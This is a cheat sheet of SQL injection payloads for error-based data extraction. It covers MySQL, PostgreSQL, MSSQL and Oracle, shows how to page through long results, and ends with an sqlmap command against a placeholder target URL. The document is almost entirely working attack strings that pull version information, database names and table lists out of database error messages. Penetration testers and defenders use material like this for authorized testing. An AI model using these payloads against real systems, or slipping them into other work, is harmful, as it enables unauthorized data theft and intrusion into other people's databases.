# SQL Injection - Error-Based Extraction

## MySQL Error-Based

### XPATH Error (extractvalue/updatexml)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
```
Note: extractvalue/updatexml truncate output to ~32 chars. Use SUBSTRING to page through longer data.

### Duplicate Entry Error
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### GTID Error (MySQL 5.7+)
```sql
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)-- -
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),7770)-- -
```

### JSON Error (MySQL 5.7+)
```sql
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))-- -
```

## PostgreSQL Error-Based
```sql
' AND CAST((SELECT version()) AS int)--
' AND (SELECT CAST(current_database() AS int))--
' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS int)--
```

## MSSQL Error-Based
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))--
' AND 1=(SELECT COUNT(*) FROM sys.columns AS a, sys.columns AS b, sys.columns AS c WHERE 1=CONVERT(int,(SELECT @@version)))--
```

## Oracle Error-Based
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

## Paging Through Long Data (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables),1,30)))-- -
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables),31,30)))-- -
```

## Automated
```bash
sqlmap -u "https://target.com/page?id=1" --technique=E
```
